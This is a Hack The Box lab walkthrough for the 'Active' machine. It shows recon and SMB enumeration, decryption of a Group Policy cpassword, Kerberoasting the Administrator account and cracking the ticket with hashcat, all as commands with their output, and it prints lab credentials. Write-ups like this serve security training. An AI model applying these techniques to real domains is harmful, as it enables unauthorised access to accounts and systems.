# Active

Active is a easy HTB lab that focuses on active Directory, sensitive information disclosure and privilege escalation. In this walkthrough, we will go over the process of exploiting the services and gaining access to the root user.

<!-- toc -->

### Recon

The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.

```
[★]$ sudo nmap -p- -sV -sC 10.129.13.59

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-05 17:01 GMT
Nmap scan report for 10.129.13.59
Host is up (0.047s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-05 17:02:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49175/tcp open  msrpc         Microsoft Windows RPC
49176/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-05T17:03:33
|_  start_date: 2024-01-05T16:54:22
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.67 seconds
```

Adding new domains to `/etc/hosts`. `sudo tee --append /etc/hosts <<< "10.129.13.59 active.htb"`

Enumerating the SMB using unauthenticated access, we can get the some information:
```
$ sudo crackmapexec smb 10.129.13.59 -u '' -p '' --shares;
$ sudo crackmapexec smb 10.129.13.59 -u 'a' -p '' --shares;
$ sudo crackmapexec smb 10.129.13.59 -u 'a' -p '' --rid-brute;
$ sudo smbclient -N -L \\\\10.129.13.59 -U '';

SMB         10.129.13.59    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.13.59    445    DC               [+] active.htb\: 
SMB         10.129.13.59    445    DC               [+] Enumerated shares
SMB         10.129.13.59    445    DC               Share           Permissions     Remark
SMB         10.129.13.59    445    DC               -----           -----------     ------
SMB         10.129.13.59    445    DC               ADMIN$                          Remote Admin
SMB         10.129.13.59    445    DC               C$                              Default share
SMB         10.129.13.59    445    DC               IPC$                            Remote IPC
SMB         10.129.13.59    445    DC               NETLOGON                        Logon server share 
SMB         10.129.13.59    445    DC               Replication     READ            
SMB         10.129.13.59    445    DC               SYSVOL                          Logon server share 
SMB         10.129.13.59    445    DC               Users       
```
Downloading the information from `Replication` SMB share.

```
$ sudo smbclient -N \\\\10.129.13.59\\Replication -U '';

smb: \> prompt
smb: \> recurse ON
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (3.5 KiloBytes/sec) (average 1.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (80.1 KiloBytes/sec) (average 21.5 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (15.8 KiloBytes/sec) (average 20.4 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (31.5 KiloBytes/sec) (average 22.3 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (106.9 KiloBytes/sec) (average 34.5 KiloBytes/sec)
smb: \> 
```

### Attack

Let's see we can find something, related to the website:
```
[★]$ grep -r active.htb

{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml:<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
```

After searching about the cpassword, we found this exploit - https://www.linkedin.com/pulse/what-heck-cpassword-phil-vanmeerhaeghe
> As an administrator it makes life easier when a password value can be set through policy, the problem is that Microsoft used a very weak AES 32-byte encryption algorithm and then published the key on the support site. https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be

```
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstill********Strong2k18
```

Got Credentials - `active.htb\SVC_TGS:GPPstill********Strong2k18`

### User

Enumerating the SMB share with new credentials.
```
[★]$ sudo crackmapexec smb active.htb -u SVC_TGS -p GPPstill********Strong2k18 --shares

SMB         active.htb      445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         active.htb      445    DC               [+] active.htb\SVC_TGS:GPPstill********Strong2k18 
SMB         active.htb      445    DC               [+] Enumerated shares
SMB         active.htb      445    DC               Share           Permissions     Remark
SMB         active.htb      445    DC               -----           -----------     ------
SMB         active.htb      445    DC               ADMIN$                          Remote Admin
SMB         active.htb      445    DC               C$                              Default share
SMB         active.htb      445    DC               IPC$                            Remote IPC
SMB         active.htb      445    DC               NETLOGON        READ            Logon server share 
SMB         active.htb      445    DC               Replication     READ            
SMB         active.htb      445    DC               SYSVOL          READ            Logon server share 
SMB         active.htb      445    DC               Users           READ
```
We got access to new SMB share Users . Getting new information:
```
[★]$ sudo smbclient -N \\\\10.129.13.59\\Users -U 'SVC_TGS%GPPstill********Strong2k18';

smb: \> prompt
smb: \> recurse ON
smb: \> mget *
```

Reading the user flag:
```
[★]$ cat ~/SVC_TGS/Desktop/user.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```

### Privilege Escalation

Getting the SPN (service principal name) with the credentials we have. Read more about the attack https://www.thehacker.recipes/a-d/movement/kerberos/kerberoast here.
```
[★]$ GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.129.13.59 -request

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2024-01-05 16:55:19.080534             


[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b01abd8f5eb61b5e0ff4a58856621551$be74de6b7fe627bc9389049a4730a864f8c640003684b38dc9d711bf89f65a74c4f22fb77a69861cb6726b60ccf6e25eb41f87ef9807653df3a9c728cad25d5f633e68504751d00ebc9adf383e5d62e0a29d41470d727536c1232716be0edb8a633cadaa69774e9f6a502867235b5c92d5e5614bfc468cd46ffb65b61931a365d7a44d1fdf4d041bbbdd9e38ac6075769523b4446cb8ca878d71763cba6f870d9fd6a22d420ddca26ef2890eb402aec9f03611b35c33372fb33bb9c4d565a5e67deb58712ed4d7478818dc7cc41213a7a2a374a7eab9fa5a7247127bac13d31a87fd0167737676ef240d7ab4997ef436a4ef10fab61b9582cdc85602214ec4fa19b01ae5841675805d7eadbd9a881483577382a132a362acc447ebd51e33e04e2f4e6574bfe87a496ad0c478f22771e10fc415343da3df2ff3a94276442b5f32a16b59612366311663cc5ab348b5a98e902eac1811e12f413ac14a4aebb45e066bfcfd4fd0a83bf45d13d2fd96717a72389fc797f7892451ca01f7d1d734a4cc3539b78d60ae8f942bf92412b93b4c69d3ff64d2e6c65e8ed363211ececa09c6a81f1da783f41bac7994d7582e6fdb43b2616f471069ad30308847c58bfbe5c235ec0b28c8af00682fc25dd7c6f9810c3c7f3cc975a5ebebf7bf26321fccf6ab13d20392767ad11504761389029a96d2649eedeb7018405bd678d0660908ac2a2f108b7**********aa9b3f22a9a408710e5aae30996dbac5f3c9185bcf41171bc10a80262661a30e266ca4a59522cfa455ea2980bed9fd9ab63e1b36084ca712cc676adea4c1bc00c4bc98b12f4029e3d21e3bc81a66666c882d14276bd70a6941f264e48f4c8912b72606a8b461b186287c89a189fbf31ab55641e3071093dd81f8811c02b9b04be3ed44810cf2b0d34417e58cabf20ee9bdc9855719a7ad11fde45d7ade295b10192b8f342150a5d99b3a575bf021f24e6ffd7b2bca021ddb354b1dee3d4838c6c2985d9eb345eea51fd3ae94b123742bd2ab1864966a9c32471b6071ce24b29d12a151bac97a2a32da995e105023c33fe8861d95111c626731e4d1833f83050f2ccb567df6fcca4b213a69efc92eefb12a6a1b36912d90545ee9aad786e765c14714825d48481a080dc8956cf262923623d7f7596a229cf3f6f68f8b4d9785f99c51cec1a0ca78f25554729d1098d706f1e7d1a451b79f01502111ab645667c7ea0f3cb3695c0fee7598097ea6fa
```

Cracking the ticket using hashcat `$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt`. Got the password as `**********1968`

Getting the root flag using the SMB Share.
```
[★]$ sudo smbclient -N \\\\10.129.13.59\\Users -U 'Administrator%**********1968';

smb: \> get Administrator\Desktop\root.txt 
getting file \Administrator\Desktop\root.txt of size 34 as Administrator\Desktop\root.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)

$ cat root.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```
